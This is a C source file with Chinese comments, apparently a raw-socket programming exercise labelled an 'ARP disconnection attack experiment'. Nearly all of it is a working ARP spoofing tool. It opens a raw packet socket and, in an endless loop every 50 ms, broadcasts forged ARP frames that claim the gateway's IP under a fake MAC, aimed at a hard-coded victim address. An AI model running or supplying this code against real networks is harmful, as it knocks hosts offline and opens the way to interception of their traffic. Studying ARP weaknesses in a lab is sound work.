/*
 * 	Net_Raw_Socket.c
 *
 *  Created on: 2016年11月20日
 *      Author: morris
 *  要求：
 *  	网络编程之---原始套接字编程
 *  	ARP断网攻击实验
 *	********************************************************************
 *	1. ARP(Address Resolution Protocol),地址解析协议
 *	2. 该协议用来根据IP地址获取其对应的物理地址
 *	3. 地址解析协议是建立在网络中各个主机互相信任的基础上的，网络上的主机可以自主发送
 *	ARP应答信息，其他主机收到应答报文时不会检测该报文的真实性就会将其记录本机ARP缓存
 *	********************************************************************
 *	数据链路层地址信息结构体
 *	struct sockaddr_ll
 *	{
 *  	unsigned short sll_family;   // Always AF_PACKET
 *      unsigned short sll_protocol; // Physical-layer protocol
 *      int            sll_ifindex;  // Interface number
 *      unsigned short sll_hatype;   // ARP hardware type
 *      unsigned char  sll_pkttype;  // Packet type
 *      unsigned char  sll_halen;    // Length of address
 *      unsigned char  sll_addr[8];  // Physical-layer address
 * 	};
 */

#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <unistd.h>

#define MAC_LEN				6			//物理地址长度
#define IP4_LEN				4			//IP地址长度
#define GATEWAY				"192.168.1.1"	//网关地址
#define VICTIM				"192.168.1.100"	//被攻击的地址
#define DEV_NAME			"enp0s3"	//本机网卡设备名
#define ATTACK_FREQ			50000		//攻击频率us
#define BUFFER_SIZE			1024

/* ARP报文格式的数据帧封装 */
struct frame_arp {
	struct ether_header eth_header;	//以太网
	struct arphdr arp_header;	//arp头
	unsigned char src_mac[MAC_LEN];	//源MAC地址，伪造
	unsigned char src_ip[IP4_LEN];	//源IP地址，伪造成网关
	unsigned char dst_mac[MAC_LEN];	//目标MAC地址,置空
	unsigned char dst_ip[IP4_LEN];	//目标IP地址
};

unsigned char mac_sender[MAC_LEN] = { 0x08, 0x14, 0x11, 0x22, 0x33, 0x44 };

/* 获得网络设备索引号，原始套接字的发送需要 */
int getifindex(const char* devname) {
	struct ifreq ifreq_buf;
	int sockfd;
	int ret;
	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (sockfd < 0) {
		perror("socket");
		return -1;
	}
	strcpy(ifreq_buf.ifr_ifrn.ifrn_name, devname);
	ret = ioctl(sockfd, SIOCGIFINDEX, &ifreq_buf);
	if (ret < 0) {
		perror("ioctl");
		return -1;
	}
	close(sockfd);
	return ifreq_buf.ifr_ifru.ifru_ivalue;
}

/* ARP发送函数，只用做ARP数据包的封装和发送 */
int send_arp(int sockfd, struct in_addr sender, struct in_addr target) {
	struct sockaddr_ll sll;
	struct frame_arp frame_buf;
	int index;
	int ret;
	/* 填充ll_addr */
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	/* 接收方的MAC地址设置为广播地址，群发：ff：ff：ff：ff：ff：ff */
	memset(sll.sll_addr, 0xff, sizeof(sll.sll_addr));
	sll.sll_halen = MAC_LEN;
	index = getifindex(DEV_NAME);
	if (index < 0) {
		printf("getifindex error\r\n");
		exit(1);
	}
	sll.sll_ifindex = index;
	/* 填充整个ARP数据帧 */
	/* 填充以太网头 */
	memset(frame_buf.eth_header.ether_dhost, 0xff, MAC_LEN);
	memcpy(frame_buf.eth_header.ether_shost, mac_sender, MAC_LEN);
	frame_buf.eth_header.ether_type = htons(ETHERTYPE_ARP);
	/* 填充ARP头 */
	frame_buf.arp_header.ar_hrd = htons(ARPHRD_ETHER);
	frame_buf.arp_header.ar_pro = htons(ETHERTYPE_IP);
	frame_buf.arp_header.ar_hln = MAC_LEN;
	frame_buf.arp_header.ar_pln = IP4_LEN;
	frame_buf.arp_header.ar_op = htons(ARPOP_REQUEST);
	/* 填充ARP数据 */
	memcpy(frame_buf.src_mac, mac_sender, MAC_LEN);
	memcpy(frame_buf.src_ip, &sender.s_addr, IP4_LEN);
	memset(frame_buf.dst_mac, 0, MAC_LEN);
	memcpy(frame_buf.dst_ip, &target.s_addr, IP4_LEN);
	/* 发送 */
	ret = sendto(sockfd, &frame_buf, sizeof(frame_buf), 0,
			(struct sockaddr*) &sll, sizeof(sll));
	if (ret < 0) {
		perror("sendto");
		return -1;
	}
	return 0;
}

int main(int argc, char **argv) {
	int sockfd;
	struct in_addr sender, target;
	int ret;
	/* 创建原始套接字 */
	sockfd = socket(AF_PACKET, SOCK_RAW, 0);
	if (sockfd < 0) {
		perror("socket");
		exit(1);
	}
	/* 转换网关地址和被攻击地址 */
	ret = inet_aton(GATEWAY, &sender);
	if (ret == 0) {
		perror("inet_aton");
		exit(1);
	}
	ret = inet_aton(VICTIM, &target);
	if (ret == 0) {
		perror("inet_aton");
		exit(1);
	}
	/* 每隔50ms发送一次ARP攻击 */
	while (1) {
		send_arp(sockfd, sender, target);
		usleep(ATTACK_FREQ);
	}
	close(sockfd);
	return 0;
}

